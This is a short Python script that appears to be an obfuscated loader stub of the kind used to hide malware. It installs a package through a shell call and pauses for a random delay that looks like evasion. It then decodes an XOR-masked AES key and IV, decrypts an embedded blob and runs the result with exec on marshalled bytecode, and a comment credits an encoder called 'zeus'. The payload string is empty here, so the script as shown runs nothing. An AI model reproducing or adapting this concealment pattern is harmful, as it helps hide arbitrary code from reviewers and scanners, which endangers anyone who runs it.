import os
os.system('pip install pycryptodome') 
import base64, time, random
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import marshal


time.sleep(random.uniform(1, 3))


key = bytes([b ^ 0x42 for b in base64.b64decode("ZjvJCQfaMWTEoCy4+PXg1jg5odGx5xzDv80BtGeaWAc=")])
iv = bytes([b ^ 0x24 for b in base64.b64decode("DLu7Z14NTFvAiUmO0ZMM2Q==")])

# encoded by zeus
encrypted_data = base64.b64decode("")

# Decrypt using AES-CBC
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

# Decode from Base64 and Unmarshal (twice)
marshalled_code = base64.b64decode(decrypted_data)
exec(marshal.loads(marshalled_code))
